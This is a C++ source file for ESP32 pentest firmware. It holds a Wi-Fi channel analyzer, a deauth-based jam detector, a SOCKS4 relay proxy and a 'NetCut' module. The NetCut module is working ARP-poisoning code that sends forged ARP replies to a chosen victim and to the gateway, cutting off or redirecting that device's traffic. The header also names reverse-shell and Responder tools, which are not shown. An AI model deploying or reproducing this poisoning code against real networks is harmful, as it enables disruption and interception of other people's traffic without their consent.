// tools_extended.cpp — Additional pentest tools ported from Bruce firmware
// Channel Analyzer, Jam Detect, NetCut, SOCKS Proxy, Reverse Shell, Responder
#include <Arduino.h>
#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiServer.h>
#include <WiFiUDP.h>
#include <esp_wifi.h>
#include <DNSServer.h>
#include "wichat_hook.h"

// Functions called from CLI (cli_bridge.cpp uses extern declarations)

// =============================================================================
//  CHANNEL ANALYZER — measure airtime per channel
// =============================================================================
static volatile uint32_t ca_bytes = 0;
static volatile uint32_t ca_pkts = 0;
static volatile int8_t ca_rssi_peak = -127;
static bool ca_running = false;
static uint32_t ca_results[14];  // utilization % per channel (1-13)
static int8_t ca_rssi[14];

static void caHook(const wifi_promiscuous_pkt_t* pkt, uint16_t len) {
    ca_pkts++;
    ca_bytes += pkt->rx_ctrl.sig_len;
    if (pkt->rx_ctrl.rssi > ca_rssi_peak) ca_rssi_peak = pkt->rx_ctrl.rssi;
}

void channelAnalyzerStart() {
    ca_running = true;
    memset(ca_results, 0, sizeof ca_results);
    memset(ca_rssi, -127, sizeof ca_rssi);
    wichat_set_capture_hook(caHook);

    Serial.println("[OK] Channel analyzer running...");
    for (int ch = 1; ch <= 13 && ca_running; ch++) {
        ca_bytes = 0; ca_pkts = 0; ca_rssi_peak = -127;
        wichat_pin_channel(ch);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(200);  // 200ms dwell per channel

        uint32_t airtime_us = (ca_bytes * 8UL) / 6UL + ca_pkts * 60UL;
        uint32_t util = 200000UL ? (airtime_us * 100UL / 200000UL) : 0;
        if (util > 100) util = 100;
        ca_results[ch] = util;
        ca_rssi[ch] = ca_rssi_peak;

        Serial.printf("[DATA] CH%2d: %3lu%% load  %4lu pkts  %6lu bytes  RSSI %d\n",
            ch, (unsigned long)util, (unsigned long)ca_pkts,
            (unsigned long)ca_bytes, ca_rssi_peak);
    }
    wichat_set_capture_hook(nullptr);
    wichat_pin_channel(0);
    ca_running = false;
    Serial.println("[OK] Channel analysis complete");
}

void channelAnalyzerStop() {
    ca_running = false;
    wichat_set_capture_hook(nullptr);
    wichat_pin_channel(0);
}

// =============================================================================
//  JAM DETECT — count deauth/disassoc frames per channel
// =============================================================================
static volatile uint32_t jd_deauth = 0;
static volatile uint32_t jd_total = 0;
static bool jd_running = false;
static int jd_threshold = 10;  // deauths per second to flag

static void jdHook(const wifi_promiscuous_pkt_t* pkt, uint16_t len) {
    jd_total++;
    if (pkt->rx_ctrl.sig_len < 2) return;
    const uint8_t *f = pkt->payload;
    uint8_t ftype = (f[0] & 0x0C) >> 2;
    uint8_t fsub  = (f[0] & 0xF0) >> 4;
    if (ftype == 0 && (fsub == 0x0C || fsub == 0x0A)) jd_deauth++;
}

void jamDetectStart() {
    jd_running = true;
    wichat_set_capture_hook(jdHook);
    Serial.println("[OK] Jam detector running — scanning channels...");

    for (int ch = 1; ch <= 13 && jd_running; ch++) {
        jd_deauth = 0; jd_total = 0;
        wichat_pin_channel(ch);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        delay(100);  // 100ms dwell

        uint32_t rate = jd_deauth * 10;  // extrapolate to per-second
        bool jammed = (rate >= (uint32_t)jd_threshold);
        Serial.printf("[DATA] CH%2d: %lu deauth/s (%lu total frames) %s\n",
            ch, (unsigned long)rate, (unsigned long)jd_total,
            jammed ? "*** JAMMING DETECTED ***" : "clean");
    }
    wichat_set_capture_hook(nullptr);
    wichat_pin_channel(0);
    jd_running = false;
    Serial.println("[OK] Jam scan complete");
}

void jamDetectStop() {
    jd_running = false;
    wichat_set_capture_hook(nullptr);
    wichat_pin_channel(0);
}

// =============================================================================
//  SOCKS4 PROXY — TCP relay through the ESP32
// =============================================================================
static WiFiServer* s_socksServer = nullptr;
static bool s_socksRunning = false;
static uint32_t s_socksConns = 0;

void socksProxyStart() {
    if (!WiFi.isConnected()) {
        Serial.println("[ERR] Not connected to WiFi. Run 'connect' first");
        return;
    }
    if (s_socksServer) { Serial.println("[ERR] Already running"); return; }
    s_socksServer = new WiFiServer(1080);
    s_socksServer->begin();
    s_socksRunning = true;
    s_socksConns = 0;
    Serial.printf("[OK] SOCKS4 proxy on %s:1080\n", WiFi.localIP().toString().c_str());
}

void socksProxyStop() {
    s_socksRunning = false;
    if (s_socksServer) { s_socksServer->stop(); delete s_socksServer; s_socksServer = nullptr; }
    Serial.println("[OK] SOCKS proxy stopped");
}

// Call from loop to handle SOCKS connections
void socksProxyTick() {
    if (!s_socksRunning || !s_socksServer) return;
    WiFiClient client = s_socksServer->accept();
    if (!client) return;

    s_socksConns++;
    uint8_t buf[256];
    if (client.readBytes(buf, 8) < 8) { client.stop(); return; }

    if (buf[0] != 0x04 || buf[1] != 0x01) {
        uint8_t deny[] = {0x00, 0x5B, 0,0, 0,0,0,0};
        client.write(deny, 8); client.stop(); return;
    }

    uint16_t port = (buf[2] << 8) | buf[3];
    IPAddress dstIP(buf[4], buf[5], buf[6], buf[7]);

    // Skip userid
    while (client.available()) { if (client.read() == 0) break; }

    // SOCKS4a: hostname after userid when IP is 0.0.0.x
    String hostname = "";
    if (buf[4] == 0 && buf[5] == 0 && buf[6] == 0 && buf[7] != 0) {
        while (client.available()) {
            char c = client.read();
            if (c == 0) break;
            hostname += c;
        }
    }

    WiFiClient target;
    target.setNoDelay(true);
    bool connected = false;
    if (hostname.length() > 0) connected = target.connect(hostname.c_str(), port, 5000);
    else connected = target.connect(dstIP, port, 5000);

    if (!connected) {
        uint8_t deny[] = {0x00, 0x5B, 0,0, 0,0,0,0};
        client.write(deny, 8); client.stop(); return;
    }

    // Grant
    uint8_t grant[] = {0x00, 0x5A, (uint8_t)(port>>8), (uint8_t)port,
                       dstIP[0], dstIP[1], dstIP[2], dstIP[3]};
    client.write(grant, 8);

    Serial.printf("[DATA] SOCKS: %s:%d connected\n",
        hostname.length() > 0 ? hostname.c_str() : dstIP.toString().c_str(), port);

    // Relay data
    uint8_t relay[512];
    while (client.connected() && target.connected()) {
        if (client.available()) {
            int n = client.read(relay, sizeof relay);
            if (n > 0) target.write(relay, n);
        }
        if (target.available()) {
            int n = target.read(relay, sizeof relay);
            if (n > 0) client.write(relay, n);
        }
        delay(1);
    }
    client.stop(); target.stop();
}

// =============================================================================
//  NETCUT — ARP poisoning (requires WiFi connection)
// =============================================================================
#include <lwip/etharp.h>
#include <lwip/pbuf.h>
#include <lwip/netif.h>
#include <esp_netif.h>

// esp_wifi_internal_tx needs this private header
extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, void *buffer, uint16_t len);

struct NetcutDevice {
    IPAddress ip;
    uint8_t mac[6];
    bool cut;
};
static NetcutDevice nc_devices[16];
static int nc_count = 0;
static uint8_t nc_myMac[6];
static uint8_t nc_gwMac[6];
static ip4_addr_t nc_gwIP;
static bool nc_gwFound = false;

static void nc_sendARP(const uint8_t* dstMac, const uint8_t* senderMac,
                       uint32_t senderIP, const uint8_t* targetMac,
                       uint32_t targetIP, uint16_t opcode) {
    uint8_t pkt[42];
    // Ethernet header
    memcpy(pkt, dstMac, 6);
    memcpy(pkt + 6, senderMac, 6);
    pkt[12] = 0x08; pkt[13] = 0x06;  // ARP
    // ARP header
    pkt[14] = 0x00; pkt[15] = 0x01;  // Ethernet
    pkt[16] = 0x08; pkt[17] = 0x00;  // IPv4
    pkt[18] = 6; pkt[19] = 4;        // MAC len, IP len
    pkt[20] = (uint8_t)(opcode >> 8); pkt[21] = (uint8_t)opcode;
    memcpy(pkt + 22, senderMac, 6);
    memcpy(pkt + 28, &senderIP, 4);
    memcpy(pkt + 32, targetMac, 6);
    memcpy(pkt + 38, &targetIP, 4);
    esp_wifi_internal_tx(WIFI_IF_STA, pkt, 42);
}

void netcutScan() {
    if (!WiFi.isConnected()) {
        Serial.println("[ERR] Not connected. Run 'connect' first");
        return;
    }
    esp_wifi_get_mac(WIFI_IF_STA, nc_myMac);

    esp_netif_ip_info_t ipInfo;
    esp_netif_t* sta = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_get_ip_info(sta, &ipInfo);
    nc_gwIP.addr = ipInfo.gw.addr;

    nc_count = 0;
    nc_gwFound = false;

    // Send ARP requests to whole subnet
    Serial.println("[OK] Scanning subnet...");
    uint32_t base = ipInfo.ip.addr & ipInfo.netmask.addr;
    for (int i = 1; i < 255; i++) {
        ip4_addr_t target;
        target.addr = base | htonl(i);
        etharp_request(netif_default, &target);
        if (i % 16 == 0) delay(10);
    }
    delay(2000);  // Wait for replies

    // Read ARP table
    for (int i = 0; i < ARP_TABLE_SIZE && nc_count < 16; i++) {
        ip4_addr_t *ip_ret; struct eth_addr *eth_ret; struct netif *netif_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 0) {
            nc_devices[nc_count].ip = IPAddress(ip4_addr_get_u32(ip_ret));
            memcpy(nc_devices[nc_count].mac, eth_ret->addr, 6);
            nc_devices[nc_count].cut = false;

            if (ip_ret->addr == nc_gwIP.addr) {
                memcpy(nc_gwMac, eth_ret->addr, 6);
                nc_gwFound = true;
            }

            Serial.printf("[DATA] %2d  %15s  %02X:%02X:%02X:%02X:%02X:%02X\n",
                nc_count, nc_devices[nc_count].ip.toString().c_str(),
                eth_ret->addr[0], eth_ret->addr[1], eth_ret->addr[2],
                eth_ret->addr[3], eth_ret->addr[4], eth_ret->addr[5]);
            nc_count++;
        }
    }
    Serial.printf("[OK] Found %d devices (gateway %s)\n", nc_count,
        nc_gwFound ? "found" : "NOT found");
}

void netcutPoison(int idx) {
    if (idx < 0 || idx >= nc_count) { Serial.println("[ERR] Invalid device index"); return; }
    if (!nc_gwFound) { Serial.println("[ERR] Gateway MAC not found. Run 'netcut scan' first"); return; }

    nc_devices[idx].cut = true;
    uint32_t devIP = (uint32_t)nc_devices[idx].ip;
    uint32_t gwAddr = nc_gwIP.addr;

    // Poison victim: "gateway = me"
    nc_sendARP(nc_devices[idx].mac, nc_myMac, gwAddr, nc_devices[idx].mac, devIP, 2);
    // Poison gateway: "victim = me"
    nc_sendARP(nc_gwMac, nc_myMac, devIP, nc_gwMac, gwAddr, 2);

    Serial.printf("[OK] Poisoned device %d (%s)\n", idx, nc_devices[idx].ip.toString().c_str());
}

void netcutRestore(int idx) {
    if (idx < 0 || idx >= nc_count) { Serial.println("[ERR] Invalid index"); return; }
    if (!nc_gwFound) return;

    nc_devices[idx].cut = false;
    uint32_t devIP = (uint32_t)nc_devices[idx].ip;
    uint32_t gwAddr = nc_gwIP.addr;

    // Restore correct mappings
    nc_sendARP(nc_devices[idx].mac, nc_gwMac, gwAddr, nc_devices[idx].mac, devIP, 2);
    nc_sendARP(nc_gwMac, nc_devices[idx].mac, devIP, nc_gwMac, gwAddr, 2);

    Serial.printf("[OK] Restored device %d\n", idx);
}

void netcutStop() {
    // Restore all cut devices
    for (int i = 0; i < nc_count; i++) {
        if (nc_devices[i].cut) netcutRestore(i);
    }
    Serial.println("[OK] All devices restored");
}
